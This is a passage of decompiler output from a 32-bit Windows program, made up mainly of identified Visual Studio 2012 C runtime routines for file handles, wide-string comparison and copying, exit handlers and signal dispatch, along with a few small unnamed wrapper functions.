              iVar2 = iVar2 + iVar10;
              iVar10 = local_2c;
            } while (iVar2 < local_2c);
          }
        }
        else if (uVar6 == 0x80000000) {
LAB_0040f3a2:
          uVar3 = FUN_00409798((uint)*param_2,(LPWSTR)&local_18,3);
          if (uVar3 == 0xffffffff) goto LAB_0040f23e;
          if (uVar3 == 2) {
LAB_0040f3df:
            if ((local_18 & 0xffff) == 0xfffe) {
              FUN_00409ff1((uint)*param_2);
              piVar5 = __errno();
              *piVar5 = 0x16;
              return 0x16;
            }
            if ((local_18 & 0xffff) == 0xfeff) {
              lVar14 = __lseeki64_nolock((int)*param_2,0,unaff_ESI);
              if (lVar14 == -1) goto LAB_0040f23e;
              local_6 = 2;
              goto LAB_0040f4bb;
            }
          }
          else if (uVar3 == 3) {
            if (local_18 == 0xbfbbef) {
              local_6 = 1;
              goto LAB_0040f4bb;
            }
            goto LAB_0040f3df;
          }
LAB_0040f456:
          lVar14 = __lseeki64_nolock((int)*param_2,0,unaff_ESI);
          if (lVar14 == -1) goto LAB_0040f23e;
        }
        else if ((uVar6 == 0xc0000000) && (uVar3 != 0)) {
          if (2 < uVar3) {
            if (4 < uVar3) goto LAB_0040f367;
            lVar14 = __lseeki64_nolock((int)*param_2,0x200000000,unaff_ESI);
            if (lVar14 != 0) {
              lVar14 = __lseeki64_nolock((int)*param_2,0,unaff_ESI);
              if (lVar14 == -1) goto LAB_0040f23e;
              goto LAB_0040f3a2;
            }
          }
          goto LAB_0040f472;
        }
      }
    }
LAB_0040f4bb:
    uVar3 = local_c;
    iVar2 = ((uint)*param_2 & 0x1f) * 0x40;
    pbVar1 = (byte *)((&DAT_0041b8c0)[(int)*param_2 >> 5] + 0x24 + iVar2);
    *pbVar1 = *pbVar1 ^ (*(byte *)((&DAT_0041b8c0)[(int)*param_2 >> 5] + 0x24 + iVar2) ^ local_6) &
                        0x7f;
    iVar2 = ((uint)*param_2 & 0x1f) * 0x40;
    *(byte *)((&DAT_0041b8c0)[(int)*param_2 >> 5] + 0x24 + iVar2) =
         (char)(param_4 >> 0x10) << 7 |
         *(byte *)((&DAT_0041b8c0)[(int)*param_2 >> 5] + 0x24 + iVar2) & 0x7f;
    if ((local_7 == 0) && ((param_4 & 8) != 0)) {
      pbVar1 = (byte *)((&DAT_0041b8c0)[(int)*param_2 >> 5] + 4 + ((uint)*param_2 & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 | 0x20;
    }
    if ((local_c & 0xc0000000) != 0xc0000000) {
      return 0;
    }
    if ((param_4 & 1) == 0) {
      return 0;
    }
    CloseHandle(local_20);
    pvVar11 = ___createFile(param_3,uVar3 & 0x7fffffff,local_10,&local_3c,3,local_1c,local_14);
    if (pvVar11 != (HANDLE)0xffffffff) {
      *(HANDLE *)(((uint)*param_2 & 0x1f) * 0x40 + (&DAT_0041b8c0)[(int)*param_2 >> 5]) = pvVar11;
      return 0;
    }
    DVar9 = GetLastError();
    FID_conflict___dosmaperr(DVar9);
    pbVar1 = (byte *)((&DAT_0041b8c0)[(int)*param_2 >> 5] + 4 + ((uint)*param_2 & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    __free_osfhnd((int)*param_2);
  }
LAB_0040f13e:
  piVar5 = __errno();
  return *piVar5;
}



// Library Function - Single Match
//  __wsopen_s
// 
// Library: Visual Studio 2012 Release

errno_t __cdecl
__wsopen_s(int *_FileHandle,wchar_t *_Filename,int _OpenFlag,int _ShareFlag,int _PermissionFlag)

{
  errno_t eVar1;
  
  eVar1 = FID_conflict___sopen_helper
                    ((char *)_Filename,_OpenFlag,_ShareFlag,_PermissionFlag,_FileHandle,1);
  return eVar1;
}



// Library Function - Single Match
//  _wcsncmp
// 
// Library: Visual Studio 2012 Release

int __cdecl _wcsncmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  if (_MaxCount != 0) {
    for (; ((_MaxCount = _MaxCount - 1, _MaxCount != 0 && (*_Str1 != L'\0')) && (*_Str1 == *_Str2));
        _Str1 = _Str1 + 1) {
      _Str2 = _Str2 + 1;
    }
    return (uint)(ushort)*_Str1 - (uint)(ushort)*_Str2;
  }
  return _MaxCount;
}



// Library Function - Single Match
//  __wcsnicmp
// 
// Library: Visual Studio 2012 Release

int __cdecl __wcsnicmp(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount)

{
  wchar_t wVar1;
  int iVar2;
  int *piVar3;
  wchar_t wVar4;
  
  if (DAT_0041bbfc == 0) {
    iVar2 = 0;
    if (_MaxCount != 0) {
      if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
        piVar3 = __errno();
        *piVar3 = 0x16;
        FUN_00407ceb();
        iVar2 = 0x7fffffff;
      }
      else {
        iVar2 = (int)_Str1 - (int)_Str2;
        do {
          wVar4 = *(wchar_t *)(iVar2 + (int)_Str2);
          if ((0x40 < (ushort)wVar4) && ((ushort)wVar4 < 0x5b)) {
            wVar4 = wVar4 + L' ';
          }
          wVar1 = *_Str2;
          if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
            wVar1 = wVar1 + L' ';
          }
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
        } while (((_MaxCount != 0) && (wVar4 != L'\0')) && (wVar4 == wVar1));
        iVar2 = (uint)(ushort)wVar4 - (uint)(ushort)wVar1;
      }
    }
  }
  else {
    iVar2 = __wcsnicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  }
  return iVar2;
}



// Library Function - Single Match
//  __wcsnicmp_l
// 
// Library: Visual Studio 2012 Release

int __cdecl __wcsnicmp_l(wchar_t *_Str1,wchar_t *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  wchar_t wVar1;
  wchar_t wVar2;
  int *piVar3;
  int iVar4;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  
  iVar4 = 0;
  if (_MaxCount != 0) {
    if ((_Str1 == (wchar_t *)0x0) || (_Str2 == (wchar_t *)0x0)) {
      piVar3 = __errno();
      *piVar3 = 0x16;
      FUN_00407ceb();
      iVar4 = 0x7fffffff;
    }
    else {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,_Locale);
      if ((local_18.locinfo)->locale_name[2] == (wchar_t *)0x0) {
        iVar4 = (int)_Str1 - (int)_Str2;
        do {
          wVar1 = *(wchar_t *)(iVar4 + (int)_Str2);
          if ((0x40 < (ushort)wVar1) && ((ushort)wVar1 < 0x5b)) {
            wVar1 = wVar1 + L' ';
          }
          wVar2 = *_Str2;
          if ((0x40 < (ushort)wVar2) && ((ushort)wVar2 < 0x5b)) {
            wVar2 = wVar2 + L' ';
          }
          _Str2 = _Str2 + 1;
          _MaxCount = _MaxCount - 1;
        } while (((_MaxCount != 0) && (wVar1 != L'\0')) && (wVar1 == wVar2));
      }
      else {
        do {
          wVar1 = __towlower_l(*_Str1,&local_18);
          wVar2 = __towlower_l(*_Str2,&local_18);
          _MaxCount = _MaxCount - 1;
          _Str1 = _Str1 + 1;
          _Str2 = _Str2 + 1;
          if ((_MaxCount == 0) || (wVar1 == L'\0')) break;
        } while (wVar1 == wVar2);
      }
      iVar4 = (uint)(ushort)wVar1 - (uint)(ushort)wVar2;
      if (local_c != '\0') {
        *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
      }
    }
  }
  return iVar4;
}



// Library Function - Single Match
//  __FindPESection
// 
// Library: Visual Studio 2012 Release

PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  int iVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  uint uVar3;
  
  iVar1 = *(int *)(pImageBase + 0x3c);
  uVar3 = 0;
  p_Var2 = (PIMAGE_SECTION_HEADER)
           (pImageBase + *(ushort *)(pImageBase + iVar1 + 0x14) + 0x18 + iVar1);
  if (*(ushort *)(pImageBase + iVar1 + 6) != 0) {
    do {
      if ((p_Var2->VirtualAddress <= rva) &&
         (rva < (p_Var2->Misc).PhysicalAddress + p_Var2->VirtualAddress)) {
        return p_Var2;
      }
      uVar3 = uVar3 + 1;
      p_Var2 = p_Var2 + 1;
    } while (uVar3 < *(ushort *)(pImageBase + iVar1 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



// Library Function - Single Match
//  __IsNonwritableInCurrentImage
// 
// Library: Visual Studio 2012 Release

BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE pTarget)

{
  BOOL BVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  void *local_14;
  code *pcStack_10;
  uint local_c;
  undefined4 local_8;
  
  pcStack_10 = __except_handler4;
  local_14 = ExceptionList;
  local_c = DAT_0041a038 ^ 0x4190c8;
  ExceptionList = &local_14;
  local_8 = 0;
  BVar1 = __ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_00400000);
  if (BVar1 != 0) {
    p_Var2 = __FindPESection((PBYTE)&IMAGE_DOS_HEADER_00400000,(DWORD_PTR)(pTarget + -0x400000));
    if (p_Var2 != (PIMAGE_SECTION_HEADER)0x0) {
      ExceptionList = local_14;
      return ~(p_Var2->Characteristics >> 0x1f) & 1;
    }
  }
  ExceptionList = local_14;
  return 0;
}



// Library Function - Single Match
//  __ValidateImageBase
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release

BOOL __cdecl __ValidateImageBase(PBYTE pImageBase)

{
  uint uVar1;
  
  if (*(short *)pImageBase != 0x5a4d) {
    return 0;
  }
  uVar1 = 0;
  if (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550) {
    uVar1 = (uint)(*(short *)((int)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x10b);
  }
  return uVar1;
}



// Library Function - Single Match
//  __global_unwind2
// 
// Library: Visual Studio

void __cdecl __global_unwind2(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x40f938,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  __local_unwind2
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __cdecl __local_unwind2(int param_1,uint param_2)

{
  uint uVar1;
  void *local_20;
  undefined *puStack_1c;
  undefined4 local_18;
  int iStack_14;
  
  iStack_14 = param_1;
  puStack_1c = &LAB_0040f940;
  local_20 = ExceptionList;
  ExceptionList = &local_20;
  while( true ) {
    uVar1 = *(uint *)(param_1 + 0xc);
    if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;
    local_18 = *(undefined4 *)(*(int *)(param_1 + 8) + uVar1 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_18;
    if (*(int *)(*(int *)(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {
      __NLG_Notify(0x101);
      FUN_0040fa54();
    }
  }
  ExceptionList = local_20;
  return;
}



// Library Function - Single Match
//  __NLG_Notify
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __NLG_Notify(ulong param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_0041ae78 = param_1;
  DAT_0041ae74 = in_EAX;
  DAT_0041ae7c = unaff_EBP;
  return;
}



void FUN_0040fa54(void)

{
  code *in_EAX;
  
  (*in_EAX)();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___lock_fhandle
// 
// Library: Visual Studio 2012 Release

int __cdecl ___lock_fhandle(int _Filehandle)

{
  int iVar1;
  
  iVar1 = (_Filehandle & 0x1fU) * 0x40 + (&DAT_0041b8c0)[_Filehandle >> 5];
  if (*(int *)(iVar1 + 8) == 0) {
    __lock(10);
    if (*(int *)(iVar1 + 8) == 0) {
      InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(iVar1 + 0xc),4000);
      *(int *)(iVar1 + 8) = *(int *)(iVar1 + 8) + 1;
    }
    FUN_0040fba2();
  }
  EnterCriticalSection
            ((LPCRITICAL_SECTION)
             ((&DAT_0041b8c0)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  return 1;
}



void FUN_0040fba2(void)

{
  FUN_0040ed0f(10);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

int FUN_0040fbab(void)

{
  int iVar1;
  undefined4 *puVar2;
  int _Filehandle;
  
  _Filehandle = -1;
  iVar1 = __mtinitlocknum(0xb);
  if (iVar1 == 0) {
    _Filehandle = -1;
  }
  else {
    __lock(0xb);
    for (iVar1 = 0; iVar1 < 0x40; iVar1 = iVar1 + 1) {
      puVar2 = (undefined4 *)(&DAT_0041b8c0)[iVar1];
      if (puVar2 == (undefined4 *)0x0) {
        puVar2 = (undefined4 *)__calloc_crt(0x20,0x40);
        if (puVar2 != (undefined4 *)0x0) {
          (&DAT_0041b8c0)[iVar1] = puVar2;
          DAT_0041cf60 = DAT_0041cf60 + 0x20;
          for (; puVar2 < (undefined4 *)((&DAT_0041b8c0)[iVar1] + 0x800); puVar2 = puVar2 + 0x10) {
            *(undefined2 *)(puVar2 + 1) = 0xa00;
            *puVar2 = 0xffffffff;
            puVar2[2] = 0;
          }
          _Filehandle = iVar1 << 5;
          *(undefined *)((&DAT_0041b8c0)[_Filehandle >> 5] + 4) = 1;
          iVar1 = ___lock_fhandle(_Filehandle);
          if (iVar1 == 0) {
            _Filehandle = -1;
          }
        }
        break;
      }
      for (; puVar2 < (undefined4 *)((&DAT_0041b8c0)[iVar1] + 0x800); puVar2 = puVar2 + 0x10) {
        if ((*(byte *)(puVar2 + 1) & 1) == 0) {
          if (puVar2[2] == 0) {
            __lock(10);
            if (puVar2[2] == 0) {
              InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(puVar2 + 3),4000);
              puVar2[2] = puVar2[2] + 1;
            }
            FUN_0040fc7f();
          }
          EnterCriticalSection((LPCRITICAL_SECTION)(puVar2 + 3));
          if ((*(byte *)(puVar2 + 1) & 1) == 0) {
            *(undefined *)(puVar2 + 1) = 1;
            *puVar2 = 0xffffffff;
            _Filehandle = ((int)puVar2 - (&DAT_0041b8c0)[iVar1] >> 6) + iVar1 * 0x20;
            break;
          }
          LeaveCriticalSection((LPCRITICAL_SECTION)(puVar2 + 3));
        }
      }
      if (_Filehandle != -1) break;
    }
    FUN_0040fd47();
  }
  return _Filehandle;
}



void FUN_0040fc7f(void)

{
  FUN_0040ed0f(10);
  return;
}



void FUN_0040fd47(void)

{
  FUN_0040ed0f(0xb);
  return;
}



// Library Function - Single Match
//  __free_osfhnd
// 
// Library: Visual Studio 2012 Release

int __cdecl __free_osfhnd(int param_1)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_0041cf60)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    if (((*(byte *)(iVar3 + 4 + (&DAT_0041b8c0)[param_1 >> 5]) & 1) != 0) &&
       (*(int *)(iVar3 + (&DAT_0041b8c0)[param_1 >> 5]) != -1)) {
      if (DAT_0041b288 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0040fdad;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_0040fdad:
      *(undefined4 *)(iVar3 + (&DAT_0041b8c0)[param_1 >> 5]) = 0xffffffff;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



undefined4 __cdecl FUN_0040fdd6(uint param_1)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  
  if (param_1 == 0xfffffffe) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < (int)param_1) && (param_1 < DAT_0041cf60)) {
      iVar3 = (param_1 & 0x1f) * 0x40;
      if ((*(byte *)((&DAT_0041b8c0)[(int)param_1 >> 5] + 4 + iVar3) & 1) != 0) {
        return *(undefined4 *)((&DAT_0041b8c0)[(int)param_1 >> 5] + iVar3);
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_00407ceb();
  }
  return 0xffffffff;
}



// Library Function - Single Match
//  __set_osfhnd
// 
// Library: Visual Studio 2012 Release

int __cdecl __set_osfhnd(int param_1,intptr_t param_2)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_0041cf60)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    if (*(int *)(iVar3 + (&DAT_0041b8c0)[param_1 >> 5]) == -1) {
      if (DAT_0041b288 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0040fe96;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)param_2);
      }
LAB_0040fe96:
      *(intptr_t *)(iVar3 + (&DAT_0041b8c0)[param_1 >> 5]) = param_2;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __unlock_fhandle
// 
// Library: Visual Studio 2012 Release

void __cdecl __unlock_fhandle(int _Filehandle)

{
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)
             ((&DAT_0041b8c0)[_Filehandle >> 5] + (_Filehandle & 0x1fU) * 0x40 + 0xc));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

DWORD __cdecl FUN_0040fee5(uint param_1)

{
  int *piVar1;
  HANDLE hFile;
  BOOL BVar2;
  ulong *puVar3;
  int iVar4;
  DWORD DVar5;
  
  if (param_1 == 0xfffffffe) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < (int)param_1) && (param_1 < DAT_0041cf60)) {
      iVar4 = (param_1 & 0x1f) * 0x40;
      if ((*(byte *)(iVar4 + 4 + (&DAT_0041b8c0)[(int)param_1 >> 5]) & 1) != 0) {
        ___lock_fhandle(param_1);
        DVar5 = 0;
        if ((*(byte *)(iVar4 + 4 + (&DAT_0041b8c0)[(int)param_1 >> 5]) & 1) != 0) {
          hFile = (HANDLE)FUN_0040fdd6(param_1);
          BVar2 = FlushFileBuffers(hFile);
          if (BVar2 == 0) {
            DVar5 = GetLastError();
          }
          if (DVar5 == 0) goto LAB_0040ff94;
          puVar3 = ___doserrno();
          *puVar3 = DVar5;
        }
        piVar1 = __errno();
        *piVar1 = 9;
        DVar5 = 0xffffffff;
LAB_0040ff94:
        FUN_0040ffaa();
        return DVar5;
      }
    }
    piVar1 = __errno();
    *piVar1 = 9;
    FUN_00407ceb();
  }
  return 0xffffffff;
}



void FUN_0040ffaa(void)

{
  int unaff_EDI;
  
  __unlock_fhandle(unaff_EDI);
  return;
}



// Library Function - Single Match
//  __putwch_nolock
// 
// Library: Visual Studio 2012 Release

wint_t __cdecl __putwch_nolock(wchar_t _WCh)

{
  BOOL BVar1;
  DWORD local_8;
  
  if (DAT_0041aee4 == (HANDLE)0xfffffffe) {
    ___initconout();
  }
  if (DAT_0041aee4 != (HANDLE)0xffffffff) {
    BVar1 = WriteConsoleW(DAT_0041aee4,&_WCh,1,&local_8,(LPVOID)0x0);
    if (BVar1 != 0) {
      return _WCh;
    }
  }
  return 0xffff;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl terminate(void)
// 
// Library: Visual Studio 2012 Release

void __cdecl terminate(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_terminate != (code *)0x0) {
    (*(code *)p_Var1->_terminate)();
  }
                    // WARNING: Subroutine does not return
  _abort();
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00410042(void)

{
  _DAT_0041bd5c = EncodePointer(terminate);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __onexit
// 
// Library: Visual Studio 2012 Release

_onexit_t __cdecl __onexit(_onexit_t _Func)

{
  _onexit_t p_Var1;
  
  FUN_0040b8ab();
  p_Var1 = (_onexit_t)__onexit_nolock(_Func);
  FUN_004100bc();
  return p_Var1;
}



void FUN_004100bc(void)

{
  FUN_0040b8b4();
  return;
}



// Library Function - Single Match
//  __onexit_nolock
// 
// Library: Visual Studio 2012 Release

PVOID __cdecl __onexit_nolock(PVOID param_1)

{
  PVOID *_Memory;
  PVOID *ppvVar1;
  size_t sVar2;
  size_t sVar3;
  PVOID pvVar4;
  int iVar5;
  
  _Memory = (PVOID *)DecodePointer(DAT_0041cf6c);
  ppvVar1 = (PVOID *)DecodePointer(DAT_0041cf68);
  if ((ppvVar1 < _Memory) || (iVar5 = (int)ppvVar1 - (int)_Memory, iVar5 + 4U < 4)) {
    return (PVOID)0x0;
  }
  sVar2 = __msize(_Memory);
  if (sVar2 < iVar5 + 4U) {
    sVar3 = 0x800;
    if (sVar2 < 0x800) {
      sVar3 = sVar2;
    }
    if ((sVar3 + sVar2 < sVar2) ||
       (pvVar4 = __realloc_crt(_Memory,sVar3 + sVar2), pvVar4 == (void *)0x0)) {
      if (sVar2 + 0x10 < sVar2) {
        return (PVOID)0x0;
      }
      pvVar4 = __realloc_crt(_Memory,sVar2 + 0x10);
      if (pvVar4 == (void *)0x0) {
        return (PVOID)0x0;
      }
    }
    ppvVar1 = (PVOID *)((int)pvVar4 + (iVar5 >> 2) * 4);
    DAT_0041cf6c = EncodePointer(pvVar4);
  }
  pvVar4 = EncodePointer(param_1);
  *ppvVar1 = pvVar4;
  DAT_0041cf68 = EncodePointer(ppvVar1 + 1);
  return param_1;
}



// Library Function - Single Match
//  _atexit
// 
// Library: Visual Studio 2012 Release

int __cdecl _atexit(_func_4879 *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = __onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0041018d(undefined4 param_1)

{
  _DAT_0041bd60 = param_1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0041019a(undefined4 param_1)

{
  _DAT_0041bd64 = param_1;
  return;
}



void FUN_004101a7(void)

{
  DecodePointer(DAT_0041bd70);
  return;
}



void __cdecl FUN_004101b4(undefined4 param_1)

{
  DAT_0041bd68 = param_1;
  DAT_0041bd6c = param_1;
  DAT_0041bd70 = param_1;
  DAT_0041bd74 = param_1;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _raise
// 
// Library: Visual Studio 2012 Release

int __cdecl _raise(int _SigNum)

{
  bool bVar1;
  uint uVar2;
  int *piVar3;
  PVOID Ptr;
  code *pcVar4;
  code *pcVar5;
  int iVar6;
  _ptiddata p_Var7;
  int local_38;
  void *local_34;
  code **local_20;
  
  bVar1 = false;
  p_Var7 = (_ptiddata)0x0;
  if (_SigNum < 0xc) {
    if (_SigNum != 0xb) {
      if (_SigNum == 2) {
        local_20 = (code **)&DAT_0041bd68;
        Ptr = DAT_0041bd68;
        goto LAB_00410287;
      }
      if (_SigNum != 4) {
        if (_SigNum == 6) goto LAB_0041025f;
        if (_SigNum != 8) goto LAB_0041024d;
      }
    }
    p_Var7 = __getptd_noexit();
    if (p_Var7 == (_ptiddata)0x0) {
      return -1;
    }
    uVar2 = _siglookup(_SigNum,(uint)p_Var7->_pxcptacttab);
    local_20 = (code **)(uVar2 + 8);
    pcVar4 = *local_20;
  }
  else {
    if (_SigNum == 0xf) {
      local_20 = (code **)&DAT_0041bd74;
      Ptr = DAT_0041bd74;
    }
    else if (_SigNum == 0x15) {
      local_20 = (code **)&DAT_0041bd6c;
      Ptr = DAT_0041bd6c;
    }
    else {
      if (_SigNum != 0x16) {
LAB_0041024d:
        piVar3 = __errno();
        *piVar3 = 0x16;
        FUN_00407ceb();
        return -1;
      }
LAB_0041025f:
      local_20 = (code **)&DAT_0041bd70;
      Ptr = DAT_0041bd70;
    }
LAB_00410287:
    bVar1 = true;
    pcVar4 = (code *)DecodePointer(Ptr);
  }
  if (pcVar4 == (code *)0x1) {
    return 0;
  }
  if (pcVar4 == (code *)0x0) {
    __exit(3);
  }
  if (bVar1) {
    __lock(0);
  }
  if (((_SigNum == 8) || (_SigNum == 0xb)) || (_SigNum == 4)) {
    local_34 = p_Var7->_tpxcptinfoptrs;
    p_Var7->_tpxcptinfoptrs = (void *)0x0;
    if (_SigNum == 8) {
      local_38 = p_Var7->_tfpecode;
      p_Var7->_tfpecode = 0x8c;
      goto LAB_004102e6;
    }
  }
  else {
LAB_004102e6:
    iVar6 = DAT_004145d0;
    if (_SigNum == 8) {
      for (; iVar6 < DAT_004145d4 + DAT_004145d0; iVar6 = iVar6 + 1) {
        *(undefined4 *)(iVar6 * 0xc + 8 + (int)p_Var7->_pxcptacttab) = 0;
      }
      goto LAB_00410327;
    }
  }
  pcVar5 = (code *)EncodePointer((PVOID)0x0);
  *local_20 = pcVar5;
LAB_00410327:
  FUN_0041034b();
  if (_SigNum == 8) {
    (*pcVar4)(8,p_Var7->_tfpecode);
  }
  else {
    (*pcVar4)(_SigNum);
    if ((_SigNum != 0xb) && (_SigNum != 4)) {
      return 0;
    }
  }
  p_Var7->_tpxcptinfoptrs = local_34;
  if (_SigNum == 8) {
    p_Var7->_tfpecode = local_38;
  }
  return 0;
}



void FUN_0041034b(void)

{
  int unaff_EBX;
  
  if (unaff_EBX != 0) {
    FUN_0040ed0f(0);
  }
  return;
}



// Library Function - Single Match
//  _siglookup
// 
// Library: Visual Studio 2012 Release

uint __cdecl _siglookup(int param_1,uint param_2)

{
  uint uVar1;
  
  uVar1 = param_2;
  do {
    if (*(int *)(uVar1 + 4) == param_1) break;
    uVar1 = uVar1 + 0xc;
  } while (uVar1 < DAT_004145c8 * 0xc + param_2);
  if ((DAT_004145c8 * 0xc + param_2 <= uVar1) || (*(int *)(uVar1 + 4) != param_1)) {
    uVar1 = 0;
  }
  return uVar1;
}



// Library Function - Single Match
//  _wcslen
// 
// Libraries: Visual Studio 2010 Release, Visual Studio 2012 Release, Visual Studio 2015 Release,
// Visual Studio 2019 Release

size_t __cdecl _wcslen(wchar_t *_Str)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  
  pwVar2 = _Str;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  return ((int)pwVar2 - (int)_Str >> 1) - 1;
}



// Library Function - Single Match
//  _wcsncpy_s
// 
// Library: Visual Studio 2012 Release

errno_t __cdecl _wcsncpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src,rsize_t _MaxCount)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  rsize_t rVar4;
  int iVar5;
  
  if (_MaxCount == 0) {
    if (_Dst == (wchar_t *)0x0) {
      if (_SizeInWords == 0) {
        return 0;
      }
    }
    else {
LAB_004103f9:
      if (_SizeInWords != 0) {
        if (_MaxCount == 0) {
          *_Dst = L'\0';
          return 0;
        }
        if (_Src != (wchar_t *)0x0) {
          rVar4 = _SizeInWords;
          if (_MaxCount == 0xffffffff) {
            iVar5 = (int)_Dst - (int)_Src;
            do {
              wVar1 = *_Src;
              *(wchar_t *)(iVar5 + (int)_Src) = wVar1;
              _Src = _Src + 1;
              if (wVar1 == L'\0') break;
              rVar4 = rVar4 - 1;
            } while (rVar4 != 0);
          }
          else {
            pwVar3 = _Dst;
            do {
              wVar1 = *(wchar_t *)(((int)_Src - (int)_Dst) + (int)pwVar3);
              *pwVar3 = wVar1;
              pwVar3 = pwVar3 + 1;
              if ((wVar1 == L'\0') || (rVar4 = rVar4 - 1, rVar4 == 0)) break;
              _MaxCount = _MaxCount - 1;
            } while (_MaxCount != 0);
            if (_MaxCount == 0) {
              *pwVar3 = L'\0';
            }
          }
          if (rVar4 != 0) {
            return 0;
          }
          if (_MaxCount == 0xffffffff) {
            _Dst[_SizeInWords - 1] = L'\0';
            return 0x50;
          }
          *_Dst = L'\0';
          piVar2 = __errno();
          iVar5 = 0x22;
          goto LAB_0041041e;
        }
        *_Dst = L'\0';
      }
    }
  }
  else if (_Dst != (wchar_t *)0x0) goto LAB_004103f9;
  piVar2 = __errno();
  iVar5 = 0x16;
LAB_0041041e:
  *piVar2 = iVar5;
  FUN_00407ceb();
  return iVar5;
}



// Library Function - Single Match
//  ___crtMessageBoxW
// 
// Library: Visual Studio 2012 Release

int __cdecl ___crtMessageBoxW(LPCWSTR _LpText,LPCWSTR _LpCaption,UINT _UType)

{
  bool bVar1;
  code *pcVar2;
  undefined3 extraout_var;
  HMODULE hModule;
  DWORD DVar3;
  FARPROC pFVar4;
  BOOL BVar5;
  int iVar6;
  code *pcVar7;
  int iVar8;
  undefined local_28 [4];
